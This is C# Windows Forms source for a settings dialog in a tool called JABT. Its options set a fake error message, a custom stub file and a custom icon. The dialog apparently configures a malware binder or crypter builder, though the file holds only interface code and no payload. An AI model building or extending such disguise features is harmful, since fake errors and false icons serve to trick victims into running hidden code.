using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace JABT
{
    public partial class fConf : Form
    {
        Form1 parent;
        public fConf(Form1 own)
        {
            parent = own;
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            fStubInfo frm = new fStubInfo();
            frm.ShowDialog();
        }

        private void button5_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            if(checkBox1.Checked == true){
                if (textBox2.Text.Contains("#"))
                {
                    MessageBox.Show("Don't use # in the error-text!");
                    return;
                }
                else if (textBox2.Text.Contains("|"))
                {
                    MessageBox.Show("Don't use | in the error-text!");
                    return;
                }


                parent.fakeErr = textBox2.Text;
            }else{
                parent.fakeErr = "False";
            }

            if (checkBox3.Checked == true)
            {
                parent.customStub = textBox1.Text;
            }
            else
            {
                parent.customStub = "False";
            }

            if (checkBox2.Checked == true)
            {
                parent.customIcon = pictureBox1.Tag.ToString();
            }
            else
            {
                parent.customIcon = "False";
            }
            
            parent.configured = true;
            this.Close();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            openFileDialog1.ShowDialog();
            if (System.IO.File.Exists(openFileDialog1.FileName))
            {
                textBox1.Text = openFileDialog1.FileName;
            }
            
        }

        private void button3_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog2 = new OpenFileDialog();
            openFileDialog2.Title = "Open Icon";
            openFileDialog2.Filter = "Icons|*.ico";
            openFileDialog2.DefaultExt = "ico";
            openFileDialog2.FilterIndex = 1;
            openFileDialog2.ShowDialog();



            if (!System.IO.File.Exists(openFileDialog2.FileName))
            {
                return;
            }
            Icon icon = new Icon(openFileDialog2.FileName);

            Image img = icon.ToBitmap();

            pictureBox1.Image = img;
        }
    }
}